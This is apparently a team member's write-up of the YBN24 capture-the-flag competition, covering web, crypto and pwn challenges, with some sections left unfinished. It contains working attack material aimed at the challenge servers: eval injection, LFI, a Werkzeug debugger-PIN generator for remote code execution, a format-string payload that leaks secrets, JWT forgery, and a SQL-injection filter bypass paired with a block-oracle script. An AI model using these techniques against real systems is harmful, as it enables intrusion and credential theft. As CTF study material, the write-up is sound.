We managed to get 14th place out of 123 with 21632 points but sadly did not qualify. Challenges roughly ordered by how hard I felt they were.
Solves:  Hero 1(crypto?), Inspector Who(web), Don't Look At Me!!!(web), Web web web(web), Simple website(web), Stationary threat(web), Number oracle(web), MORE KABOOMMMMM(web), cool math games(crypto), Memory sim(pwn), View source revenge(web), NoButYes(web), Needle in a haystack(pwn)
## Hero 1
This wasn't really a cryto challenge.
```python
from Crypto.Util.number import getPrime, bytes_to_long

flag = b"YBN24{????????????????????????}"

p = getPrime(256)
q = getPrime(256)
y = getPrime(256)
e = getPrime(64)
c = getPrime(32)


try:
    a = int(eval(input("a: ")))
    b = int(eval(input("b: ")))

    assert a > 0
except:
    quit()


g = q * e
n = ((a) ** (b + c)) * p * q * y

enc = pow(bytes_to_long(flag), e, n)

ct = enc * y

print("g = {}".format(g))
print("n = {}".format(n))
print("ct = {}".format(ct))
```
For some reason, the inputs a and b are directly evaluated, so we can simple submit `print(flag)` as the input and we will get the flag.
`YBN24{RS4_mu1t!prim3_f4ct0r1ng}`
## Inspector who
"Hey I came across this website displaying a 3D model of the TARDIS! I wonder what I can find from INSPECTING this site..."
By using the power of inspect element, we find the flag
![[Pasted image 20241201110933.png]]
`YBN24{1_l0v3_1n5p3ct_3l3m3nt}`
## Don't look at me!
Once again with the power of inspect element, we see that a script `decrypt.js` is being loaded
![[Pasted image 20241201111141.png]]It seems the script is obfuscated so we throw it into a js deobfuscator.
```js
function _0x3ca409(_0x50cea5, _0x1e126b) {
  let _0xdce022 = '';
  for (let _0x2eb5b4 = 0; _0x2eb5b4 < _0x50cea5.length; _0x2eb5b4++) {
    let _0x128b0a = _0x50cea5.charCodeAt(_0x2eb5b4) ^ _0x1e126b.charCodeAt(_0x2eb5b4 % _0x1e126b.length);
    _0x128b0a = _0x128b0a ^ 7;
    _0xdce022 += String.fromCharCode(_0x128b0a);
  }
  return _0xdce022;
}
async function _0x1dc557() {
  const _0x5f3d96 = await fetch("encryptedFlag.txt");
  return await _0x5f3d96.text();
}
async function _0x2c43cf() {
  const _0x1d2082 = await _0x1dc557();
  const _0x3b9633 = _0x3ca409(_0x1d2082, 'IAMINSOMUCHPAIN');
  const _0x3196bc = document.getElementById("secret");
  _0x3196bc.innerHTML = _0x3b9633;
  window._0x5cd0b7 = () => {};
}
```
The function `_0x2c43cf()` seems to be responsible for giving us the flag, load the deobfuscated script into the js console and call `_0x2c43cf()`, giving us the flag
![[Pasted image 20241201111523.png]]
`YBN24{I_To1d_y0u_not_T0_Peek!}`
## Web web web
Once again through inspect element, we are able to find parts of the flag. This time, the flag seemed to be split up across different files
![[Pasted image 20241201112322.png]]
![[Pasted image 20241201112341.png]]
![[Pasted image 20241201112428.png]]
The last part was slightly trickier. After quite some time searching, I still could not find it and decided to load burp to assist in searching for it.
![[Pasted image 20241202195015.png]]
From burp, only 3 requests contained the phrase `part`, meaning the last part of the flag was not from the same page.  I decided to poke around at other common endpoints such as `/sitemap.xml` and `robots.txt`, ultimately finding the flag from `robots.txt`
![[Pasted image 20241202195217.png]]
![[Pasted image 20241202195228.png]]
`YBN24{th1s_1s_4_c4ll_f0r_h3lp}`
## Simple website
For this challenge, the site seems to display whatever file it finds from the `?page=...` query parameter.
![[Pasted image 20241202195414.png]]
As such, this is a LFI challenge and I started poking around for possible locations the flag might be. 
![[Pasted image 20241202195617.png]]After trying various paths, I found the flag in `/flag.txt`
![[Pasted image 20241202195533.png]]
`YBN24{lfi_vuln3rable}`
>  I didn't know text files could be directly included but it do be like that I guess
## Stationary threat
Source code is provided for this challenge. The important parts are
```python
roles = ['user', 'student','admin', 'teacher']
...
@app.route('/api/users/<_id>/roles', methods=['POST'])  
def create_role(_id):  
    # Our State of the Art Authentication System  
    if 1==1:  
        _id = int(_id)  
        if _id < 0 or _id > len(roles):  
            return jsonify({'message': 'Invalid id'}), 400  
        session['role'] = roles[_id]  
        return jsonify({'message': 'Role created successfully'})  
    else:  
        return jsonify({'message': 'Unauthorized'}), 401  
    @app.route('/nuke')  
def nuke():  
    role = session.get('role',"user")  
    if role == 'admin':  
        flag = open('flag.txt','r').read()  
    else:  
        flag = None   
return render_template('nuke.html', flag=flag)
```
* The `/nuke` endpoint, which requires us to have the `admin` role retrieved from the session storage.
* The  `/api/users/<_id>/roles` endpoint, which has no authentication and allows us to submit any role id and have it stored in the session storage. 
Thus, a simple post request of `https://stationary-threat-stationary-threat-chall.ybn.sg/api/users/2/roles` allows us to obtain the admin role, then `/nuke`
`YBN24{@utHEnT!cA71On?_wha7'S_7h4t?}`
## Number oracle
A site where we have to consecutively guess the correct numbers. No source code is provided
![[Pasted image 20241202201153.png]]
Since no source code was provided, I started poking around the page
![[Pasted image 20241202201333.png]]
We can see that there is no script client side and that verification is done by the server.
![[Pasted image 20241202201508.png]]
There is also a session cookie, which when [decoded](https://www.kirsle.net/wizards/flask-session.cgi) reveals the next number is actually kept in session storage (which when using flask sessions is viewable, but not editable without the secret key).
![[Pasted image 20241202201702.png]]
Thus, by retrieving the session cookie and decoding it each guess, we can correctly submit the next number. I was lazy to do it by hand 10 times so I made a quick script
```python
import requests, base64, json  
  
endpoint = "https://number-oracle-number-oracle-chall.ybn.sg/" 
session = requests.Session()  
  
r = None  
def make_req(num=0):  
    try:  
        global r  
        data = {"guess": num}  
        r = session.post(endpoint, data=data)  
        cookies = session.cookies.get("session")  
        print(cookies)  
        cookies = cookies.split(".")[0]  
        # Add padding if necessary  
        padding_needed = len(cookies) % 4  
        if padding_needed:  
            cookies += '=' * (4 - padding_needed)  
        s = base64.b64decode(cookies).decode()  
        num = json.loads(s)["next_guess"]  
        print(num)  
        return num  
    except Exception as e:  
        print(r.text)  
        print(session.cookies)  
        raise e  
  
num = 0  
i = 0  
while True:  
    i+= 1  
    num = make_req(num)  
    print("Occ:", i)  
    if (i > 10):  
        break  
  
print(r.text)  
print(session.cookies)
```
`YBN24{D0nT_pUT_$3CR3Ts_IN_53S$1ON_coOk1Es_a2650f92c6893e5bb6437}`
## MORE KABOOMMMMM
Source code is provided for this challenge.
![[Pasted image 20241202202146.png]]
```js
...
router.post('/nuke', (req, res) => {  
    // Call the backend script with the provided data  
    const data = req.body;  
    if (!data.baba || !data.nukes) {  
        res.status(400).json({ error: 'Invalid data' });  
        return  
    }  
    if (data.baba.length !== 2 || data.nukes.some(nuke => nuke.length !== 2)) {  
        res.status(400).json({ error: 'Invalid data' });  
        return  
    }  
  
  
    const {baba,nukes} = data;  
    baba[0] = Number(baba[0])  
    baba[1] = Number(baba[1])  
    if (baba[0] < 0 || baba[0] > 20 || baba[1] < 0 || baba[1] > 20){  
        res.status(400).json({ error: 'Data Out Of Range' });  
        return  
    }  
    // add an extra nuke at baba's exact position  
    nukes.push(baba)  
    var number_of_nukes_hit = 0  
  
    for (let nuke of nukes){  
        let [x,y] = nuke;  
        x = parseInt(x)  
        y = parseInt(y)  
        if (x < 0 || x > 20 || y < 0 || y > 20){  
            res.status(400).json({ error: 'Data Out Of Range' });  
            return  
        }  
        if (Math.abs(baba[0]-x) <= 5 && Math.abs(baba[1]-y) <= 5){  
            number_of_nukes_hit += 1  
        }  
    }  
    if (number_of_nukes_hit >= 1){  
        res.status(200).json({result: `Good Job Comarade. Baba has been successfully nuked! He has suffered a total of ${number_of_nukes_hit} damage.`});  
    }  
    else {  
        res.status(200).json({result: `Baba is safe. You have failed the motherland. ${flag} `});  
    }  
});
```
Our goal for this challenge is to *not* get Baba nuked, despite there always being a free nuke added at Baba's position. The vulnerability comes from this line
```js
    baba[0] = Number(baba[0])  
    baba[1] = Number(baba[1])  
```
, which directly throws the text we provide into a `Number` constructor. As per the [mdn docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number#:~:text=returns%20NaN), a number that can't be parsed will return `NaN`, which could be used to bypass checks. In this case, `Nan > ...` and `Nan < ...` both return false, thus the position is considered within range and the baba position check succeeds. `Math.abs(baba[0]-x)` will still return `NaN`, which also causes the range checks to fail and no nukes are counted. 
![[Pasted image 20241202203101.png]]
`YBN24{I_10VE_J4vaScR1P7}`
## Cool math games
Source code is provided. Similar to number oracle, we are supposed to guess the next number except this time without the server providing it.
main.py:
```python
RAND_SEED = os.getenv("seed")  
random.seed(int(RAND_SEED))  
  
def generate_random_string():  
    return "".join([random.choice(ascii_lowercase + ascii_uppercase + digits) for _ in range(32)])  
  
rounds = 160  
print(f"Welcome to my game! Your user ID is \"{generate_random_string()}\"")  
print("Complete all the rounds of this game, and you win the flag! Good luck!")  
for i in range(rounds):  
    print('*'*8, f"Round {i+1}", '*'*8)  
    answer_string = generate_random_string()  
    guess = str(input("Enter the string: "))  
    if guess != answer_string:  
        print("Sorry, but your response was wrong. Out!")  
        exit()  
    print()  
    print(f"Congratulations! Here is your flag: {os.getenv('FLAG')}")
```
startup.sh:
```bash
#!/bin/bash  
  
sudo apt install socat -y  
sudo apt install python3 -y  
  
seed=$RANDOM  
export seed # Credits to Jabriel for the idea  
export FLAG="YBN24{this_is_a_fake_flag}"  
  
pip install -r requirements.txt  
socat -dd TCP-LISTEN:1337,fork,reuseaddr EXEC:"python server.py"
```
From the startup script, we can see that the seed is set before the servers run, meaning that the seed is fixed across connections.  Checking what `$RANDOM` is, we find it is a random number between [0 and 32767](https://stackoverflow.com/a/1194890). When we first connect, we are given a random user id based on the seed, meaning we can brute force all 32768 seeds until one correctly generates the same user id.
```python
for i in range(32768):  
    random.seed(i)  
    if generate_random_string() == "QfcBV6xiFUrhKL92jxRDP8zudB7XnBcg":  # Our user id
        print(i)
```
From there, we can seed our generator to match the rng used by the server, giving us the exact same randomness as generated by the server.
```python
p = remote("tcp.ybn.sg", 28480)  
id = p.recvline()  
if "QfcBV6xiFUrhKL92jxRDP8zudB7XnBcg" not in id:  
    print("Wrong remote")  
    exit()  
p.recvline()  
p.recvline()  
  
random.seed(7631)  
generate_random_string()  # COmpensate for the 1 user id generated
for i in range(160):  
    p.sendline(generate_random_string())  
    print(p.recvline())  
print(p.recvline())
```
`YBN24{wH0_kN0w5_8a5H_R4nD0m_w4sn7_s0_rAnD0m_4ft3r_4ll}`
> The seed can actually be found within the same connection to the server, thus we can both find the seed and then immediately start submitting guesses
## Memory sim
A python pwn challenge that simulates memory(?). The goal of this challenge is to access a string from a restricted address. The functions for reading and writing to the memory are:
```python
def write_string(s, ind):  
	sl = len(s)  
    if ind+sl >= len(MEMORY):  
        return -1  
    MEMORY[ind-1] = len(s)  
    for i in range(ind, ind+sl):  
        MEMORY[i] = ord(s[i-ind])  
    return (ind-1) % MLEN
def read_string(ind):  
	stringLen = MEMORY[ind]  
    ind += 1  
    if ind+stringLen >= len(MEMORY):  
        return -1  
    return "".join([chr(i) for i in MEMORY[ind:ind+stringLen]])
```
* `write_string()`, which writes the ordinals of the characters in  string `s`  at the address space `[ind, ind+string length)`, and writes the length of the string at index `ind-1`. It returns the address we can use with `read_string()` to obtain the string from memory
* `read_string()`, which reads the length of the string at address `ind`, and reads the integers as characters from memory at the address space `[ind+1, ind+string length+1)`
We then have the main program, responsible for taking and validating user input before calling those functions
```python
from string import printable
MLEN = 1000  
READ_ONLY = 900  
MEMORY = [0] * MLEN  
MENU = """1. write  
2. read  
>> """
flag = "YBN24{?????????????????????????????????????}"  
write_string(flag, 950)  
cached = []  
while True:  
    choice = int(input(MENU))  
    if choice == 1:  
        ustr = str(input("Enter string\n>> "))  
        if not all(i in printable for i in ustr):  
            print("invalid string")  
            continue  
        uid = int(input("Enter address\n>> "))  
        if uid >= READ_ONLY:  
            print("sorry, this region's read only")  
            continue  
        res = write_string(ustr, uid)  
        if res == -1:  
            print("error")  
            continue  
        print("string written successfully! You can view it at", res)  
        cached.append(res)  
        print(f"You can now access {cached}")  
  
    elif choice == 2:  
        uid = int(input("Enter address\n>> "))  
        if uid not in cached:  
            print("Hey, no out of bounds access! >:(")  
            continue  
        res = read_string(uid)  
        if res == -1:  
            print("error")  
            continue  
        print("Your string:", res)  
  
    else:  
        print("Invalid choice!")
```
Here, we are restricted from writing at the read only region, and our input has to be a printable character. It should be noted there are no restrictions that prevent us from reading into the restricted region. By having `read_string` fetch the length of its string from an address where a character was stored instead of the strings length, we could read into the restricted region.
```
write_string('d', 898)
| Address  |        897        |   898    |
|----------|-------------------|----------|
| Value    | 1 (String length) | ord('d') |
                                 ^ We read from this address
```
However, there is a check in place to ensure we can only read from addresses we've written to. If the address is not in `cache`, we are prevented from reading there. We can circumvent this by simply writing a string at `address+1` to add `address` to the cache, then write our payload.
```
write_string('a', 899)
| Address  | 898 |        899        |   900    |
|----------|-----|-------------------|----------|
| Value    |     | 1 (string length) | ord('a') |
Cache: [898]

write_string('d', 898)
| Address  |        898        |   899    |   900    |
|----------|-------------------|----------|----------|
| Value    | 1 (string length) | ord('d') | ord('a') |
Cache: [897, 898]

read_string(898)
| Address  |        898        |   899    |   900    |
|----------|-------------------|----------|----------|
| Value    | 1 (string length) | ord('d') | ord('a') |
 This is the string length read ^ 

```
Thus, our input is as such:
1. 1 a 899
2. 1 d 898
3. 2 898
`YBN24{n3g4tive_inDexeS_aNd_struCt_ov3rfl0W!}`
## View source revenge
A site that allows us to view the contents of any file
![[Pasted image 20241202212041.png]]
I first tried viewing `flag.txt`, which returned an empty page
![[Pasted image 20241202212206.png]]
Trying `/flag.txt`, we instead get an error, suggesting the flag was probably censored. Next, I tried the common file names `app.py` and `Dockerfile` and managed to retrieve their content
```python
# Run by Docker
# This file is included to reduce the guessiness of this challenge. 
# The file run is main.py, which is the identical as the file here.

from flask import Flask, request, render_template , redirect, url_for,render_template_string
import os 
app = Flask(__name__)
FLAG = open('flag.txt').read()

@app.route('/')
def index():
    return render_template('index.html')
    
@app.route('/view', methods = ["GET"])
def view():
    file_name = request.args.get('file_name')
    if not file_name:
        return redirect(url_for('index'))
    
    file_path = os.path.join(os.getcwd(), file_name)
    
    if not os.path.exists(file_path):
        return render_template('error.html')
    
    with open(file_path, "r") as f:
        content = f.read()
    
    content = content.replace(FLAG, "")

    return render_template("display.html",content = content,file_name = file_name)

if __name__ == '__main__':
    app.run(debug = True)
```
It is indeed shown that the flag is censored
```Dockerfile
# Use an official Python runtime as a parent image
FROM python:3.11-slim
# Set the working directory in the container
WORKDIR /usr/src/app
# Copy the requirements file into the container
COPY requirements.txt ./
# Install any necessary dependencies
RUN pip install --no-cache-dir -r requirements.txt
# Create a new user and group with a secure name
RUN useradd -m very_secure_username
# Change ownership of the working directory to the newly created user
RUN chown -R very_secure_username:very_secure_username /usr/src/app
# Switch to the new user
USER very_secure_username
# Copy the application code into the container
COPY . /usr/src/app
# Set environment variables
ENV FLASK_APP=app.py
ENV FLASK_ENV=development
ENV FLASK_DEBUG=1
# Expose the port the app runs on
EXPOSE 5000
# Command to run the application
CMD ["flask", "run", "--host=0.0.0.0"]
```
From the dockerfile, we see that `FLASK_DEBUG` is enabled, meaning the `/console` endpoint is exposed. Given both LFI and debug mode, we are able to generate the [debugger pin](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) and gain RCE. I had also tried to automatically leak the pin using https://github.com/Ruulian/wconsole_extractor but did not succeed(Perhaps my extractor code was broken).
After gaining all the information required, we can generate  our debug pin
```python
import hashlib  
from itertools import chain  
probably_public_bits = [  
    'very_secure_username',  # username  
    'flask.app',  # modname  
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))  
    '/usr/local/lib/python3.11/site-packages/flask/app.py'  # getattr(mod, '__file__', None),  
]  
  
private_bits = [  
    str(0x921784229705),  # str(uuid.getnode()),  /sys/class/net/ens33/address  
    '90eca5f1-105b-434e-ad02-135111eb1526'  # get_machine_id(), /etc/machine-id  
]  
  
# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0  
h = hashlib.sha1()  
for bit in chain(probably_public_bits, private_bits):  
    if not bit:  
        continue  
    if isinstance(bit, str):  
        bit = bit.encode('utf-8')  
    h.update(bit)  
h.update(b'cookiesalt')  
# h.update(b'shittysalt')  
  
cookie_name = '__wzd' + h.hexdigest()[:20]  
  
num = None  
if num is None:  
    h.update(b'pinsalt')  
    num = ('%09d' % int(h.hexdigest(), 16))[:9]  
  
rv = None  
if rv is None:  
    for group_size in 5, 4, 3:  
        if len(num) % group_size == 0:  
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')  
                          for x in range(0, len(num), group_size))  
            break  
    else:  
        rv = num  
  
print(rv) # >> 889-177-408
```
![[Pasted image 20241202214006.png]]
`YBN24{F1@sK_DEBUg_CH4L1?_1AM3}`
## NoButYes
We are given source code for this challenge. The target of this challenge is the `/admin` endpoint, where our jwt token needs to identify we have admin
```python
def get_secret(uuid):  
    db = sqlite3.connect('secrets.db')  
    db.row_factory = lambda cursor, row: row[0]  
    cursor = db.cursor()  
    sql = "SELECT secret FROM secrets WHERE uuid = ?"  
    cursor.execute(sql, (uuid,))  
    secret = str(cursor.fetchone())  
    db.close()  
    return secret

@app.route('/admin', methods=['GET'])  
def admin():  
    print(request.cookies,session)  
    if request.cookies.get('token') is None or session.get('uuid') is None:  
        return jsonify({"response": "Unauthorized", "status": 401})  
    token = request.cookies.get('token')  
    uuid = session['uuid']  
    secrets = get_secret(session['uuid'])  
    # TODO: Make somehow sign token with own/known secret?  
    try:  
        decoded = jwt.decode(token, secrets, algorithms=["HS256"])  
    except jwt.ExpiredSignatureError:  
        return jsonify({"response": "Token Expired", "status": 401})  
    except jwt.InvalidTokenError:  
        return jsonify({"response": "Invalid Token", "status": 401})  
    if decoded['admin']:  
        return jsonify({"response": f"Welcome Admin. Here's the Flag: {os.getenv('FLAG','TESTFLAG{}')}", "status": 200})  
    else:  
        return jsonify({"response": "Only admin's can access this page!", "status": 401})
```
Further reviewing the source code, we also see the `/api` endpoint, which TODO finish sentence
```python
def save_token(uuid, secret):  
    db = sqlite3.connect('secrets.db')  
    cursor = db.cursor()  
    sql = "INSERT OR IGNORE INTO secrets (uuid, secret) VALUES (?, ?)"  
    cursor.execute(sql, (uuid, secret))  
    sql = "UPDATE secrets SET secret = ? WHERE uuid = ?"  
    cursor.execute(sql, (secret, uuid))  
    db.commit()  
    db.close()

def generate_jwt_token():  
    user_info = {  
        "admin":False  
    }  
    secret = os.urandom(32)  
    secret = secret.hex()  
    token = jwt.encode(user_info,secret,"HS256")  
    return [token,secret]

@app.route('/api', methods=['POST'])  
def api():  
    session.setdefault('uuid', str(uuid.uuid4()))  
    data = request.get_json()  
    command = data.get('command')  
    # take everything before the first space and lowercase it  
    prefix = command.split(" ")[0].lower()  
  
    if prefix not in command_responses:  
        return jsonify({"response": "Invalid Command", "status": 400})  
    response = generate_response(command_responses[prefix], command)  
  
    jwt_token, secret = generate_jwt_token()  
    save_token(session['uuid'], secret)  
  
    response = make_response(jsonify({"response": response, "status": 200}))  
    response.set_cookie('token', jwt_token)  
    return response
```
From this code, it should be noted that each user has their jwt token signed with an individual secret that is not shared. The `generate_response()` function is also rather suspicious
```python
class RandomResponse:  
    def __init__(self, response: str):  
        self.response = response  
        self.reroll()  
  
    def reroll(self):  
        rand_gen = random.randint(1,10)  
        self.generated = self.response*rand_gen  
  
def generate_response(response, command):  
    responseObj = RandomResponse(response)  
    message = "{response.generated} but "+command+"."  
    return message.format(response = responseObj)
```
For some reason, there is an entire class simply to generate a random message that is repeated a random number of times. Additionally, the `message.format` function seems to be able to access attributes of `RandomResponse`, as from `{response.generated}`. Googling, I found this interesting post on reddit: https://www.reddit.com/r/Python/comments/5kzhnn/be_careful_with_pythons_newstyle_string_format/. Using their payload as a POC, we can get this
![[Pasted image 20241202223217.png]]
Using that, we are able to extract the flask secret key.
![[Pasted image 20241202215754.png]]
Using the key, we are able to forge our own session tokens, controlling `uuid`. What can we do with a custom uuid? Remember that our goal is to be able to modify the jwt token to give ourselves admin, so we need a way to sign our own jwt tokens. If we revisit `get_secret()`, one line stands out.
```python
def get_secret(uuid):
	db = sqlite3.connect('secrets.db')  
	db.row_factory = lambda cursor, row: row[0]  
	cursor = db.cursor()
	sql = "SELECT secret FROM secrets WHERE uuid = ?"  
	cursor.execute(sql, (uuid,))
	secret = str(cursor.fetchone()) # <--
	...
```
Here, the result from the query is being cast to a string. This is usually not required, as a row should be returned as a string anyways. However, if the uuid queried were to not exist, the returned `None` would be cast into a string `"None"`, thus returning the secret as `"None"`. By forging a session  token with a non-existent uuid, we are able to sign jwt tokens with `"None"`.
![[Pasted image 20241202215911.png]]
The final step is to access `/admin`, giving us the flag
![[Pasted image 20241202220039.png]]
`YBN24{8@ba_!S_A_B@d_PRo6rAmm3R}`
> It should be mentioned a team managed to find a way to gain an invalid uuid without leaking the flask secret. After the session uuid is set and before the secret is saved, there is a check to ensure the command prefix is valid. If the prefix was invalid, only the uuid is saved and the function returns, hence generating an "invalid" uuid.
> ![[Pasted image 20241202233419.png]]
> You can also leak the flag from the format string itself
> ```
> {response.init.globals[os].environ[FLAG]}
> ```

## Needle in a haystack
TODO. This is more for personal use. Using `printf()` with user supplied input is dangerous as it allows memory in the stack to be leaked. We use `%<n>$s` here to brute force leaking the flag from the stack, where n is some number. I have yet to figure out how `printf()` calculates its offsets/addresses to read from based on the number we supply and the potential data types of varying arguments before the nth one. 
`YBN24{FL4G_1N_4_ST4CK_XDDDDDD}`

# Post ctf lessons
## Essay evaluator
Usage of `...`  is a valid python object.
https://stackoverflow.com/questions/772124/what-does-the-ellipsis-object-do
## RentAHitman 1
Always consider the full scope of a potential vulnerability you are targeting. In this case, I was too focused on trying not to trip the blacklist detection.
```python
def detect_sqli(sql):  
    # List of common SQL keywords and characters often used in SQL injection  
    # TODO There are sqlite specific keywords such as ATTACH  
    disallowed_patterns = [  
        r"SELECT", r"UNION", r"JOIN", r"FROM", r"WHERE", r"ON",  
        r"OR", r"AND", r"NOT", r"IN", r"LIKE", r"DROP", r"INSERT",  
        r"DELETE", r"UPDATE", r"EXEC", r"EXECUTE", r"CREATE", r"ALTER",  
        "--", "#", ";", "/*", "*/", "@@", "0x", "'", "\"", "`", "-", "/", "*"  
    ]  
    # https://gist.github.com/cyberheartmi9/b4a4ff0f691be6b5c866450563258e86  
    # TODO OR and AND can be bypassed with || and &&  
  
    # Escape special characters and combine patterns into a single regex  
    escaped_patterns = [re.escape(pattern) if not pattern.isalnum() else pattern for pattern in disallowed_patterns]  
    combined_pattern = re.compile("|".join(escaped_patterns), re.IGNORECASE)  
  
    # Check if any disallowed pattern is found in the SQL query  
    if combined_pattern.search(sql):  
        return True  
  
    return False

@app.route('/filter', methods=["POST"])  
def filter():  
    if not session.get('is_logged_in'):  
        return redirect(url_for('login'))  
    with connect(g.uuid) as conn:  
        print(f"Mimetype is {request.mimetype_params}")  
        search = request.form['search']  
        print(f"Search term is \n{search}")  
        # Split the terms and remove any containing blacklisted terms  
        terms = search.split(" ")  
        query = "SELECT name,location,description from targets"  
        for term in terms:  
            if detect_sqli(term):  
                print(f"Removing blacklisted term {term}")  
                terms.remove(term)  
        if terms:  
            location_match = " OR ".join(f"name LIKE '%{term}%'" for term in terms)  
            name_match = " OR ".join(f"location LIKE '%{term}%'" for term in terms)  
            description_match = " OR ".join(f"description LIKE '%{term}%'" for term in terms)  
            query += " WHERE " + " OR ".join([location_match,name_match,description_match])  
            print(query)  
        cursor = conn.execute(query)  
        targets = cursor.fetchall()  
        targets = list(targets)  
    return jsonify(targets)
```
However, preventing SQLI in this code consists of not only *detection*, but also *removal* of the terms. The terms are split by spaces into a list, then a for loop iterates and removes each term if SQLI is detected. The issue lies in the loop
```python
        for term in terms:  
            if detect_sqli(term):  
                print(f"Removing blacklisted term {term}")  
                terms.remove(term)  
```
If an item is removed during iteration, the loop will skip over the next item and no detection or removal of the item happens. https://stackoverflow.com/a/1207427.
Hence, a query like `Next_term_is_skipped_SELECT %'/*You_are_free_to_execute_sql_here*/SELECT/**/BLAHBLAH.../**/;--` will allow for SQLI. 
(Comments are used to bypass spaces and prevent query from being split)
> ![[Pasted image 20241204114515.png]]

Interestingly, chatgpt would have also pointed out the solution if you chatgpt'd hard enough
https://chatgpt.com/share/674fd0a1-2870-800e-a95d-b7a7bc4bdc3e (Issue not mentioned)
https://chatgpt.com/share/674fd0b0-6dec-800e-a95f-92c880c7ef2d (Issue mentioned)
## RentAHitman 2
https://en.wikipedia.org/wiki/Padding_oracle_attack
"To my knowledge, Since AES-CBC block cipher is being used with a constant IV and a constant SALT, we are able to use an algorithm to guess each character one by one."
```python
import requests
from Crypto.Util.number import bytes_to_long
import time
import string
BASE_URL = "https://rentahitman-com-1-rentahitman-chall.ybn.sg" #TODO

# range for possible flag chars
ascii_start = 32
ascii_end = 126

block_byte_start = 0
block_byte_end = 16
block_byte_size = 16
pw = ""
payload_length = block_byte_end-len(pw)-1
starting_bytes = "a"*payload_length
uuid = "075dccc5-3b76-4a15-9306-e943c676132b"
session = "eyJpc19sb2dnZWRfaW4iOnRydWUsInVzZXJfaWQiOjN9.Z0n1ng.40KJnmVn8-Gur4fZ-4nCKLQEJCI"
GCLB = "CKDj2fyUjcrZ5AEQAw"
UserAgent = "YesButNo/1.0"
# attack until get last byte, b"}", attacks for more than 16 bytes
def get_encrypted_pw(pw):
    response = requests.post(BASE_URL+"/signup", data={"username": pw, "password": pw},cookies={"uuid":uuid,"session":session,"GCLB":GCLB},headers={"User-Agent":UserAgent})
    sqli = f"-- dhadhlsjldas%'/**/UNION/**/SELECT/**/username,password,userId/**/FROM/**/users/**/WHERE/**/username='{pw}'--"
    response = requests.post(BASE_URL+"/filter", data={"search": sqli},cookies={"uuid":uuid,"session":session,"GCLB":GCLB},headers={"User-Agent":UserAgent})
    data = response.json()[0]
    if data[0] != pw:
        print(f"Error: {data} {pw}")
        exit()
    return bytes.fromhex(data[1])

chars = string.ascii_letters + string.digits
for i in range(16):
    # payload = hex(bytes_to_long(starting_bytes))[2:]
    actual_leak = get_encrypted_pw(starting_bytes)

    # Starting payload for block attack
    part_payload = starting_bytes + pw

    # running through all possible printable chars
    found = False
    for ascii in chars:
        char = ascii
        if char in ["'", '"', "\\", " "]:
            continue
        payload = part_payload + char
        test_leak = get_encrypted_pw(payload)

        # checking if the actual leak's block and test_leak's first block match
        if test_leak[block_byte_start:block_byte_end] == actual_leak[block_byte_start:block_byte_end]:
            print(f"Found: {char}")
            pw += char
            found = True
            # going into next block already
            if payload_length % block_byte_size == 1:
                payload_length += block_byte_size - 1
                block_byte_start += block_byte_size
                block_byte_end += block_byte_size
            else:
                payload_length -= 1

            starting_bytes = "a"*payload_length
            part_payload = starting_bytes + pw
            break
    if not found:
        break
print(pw)
```
Sol by Baba is dead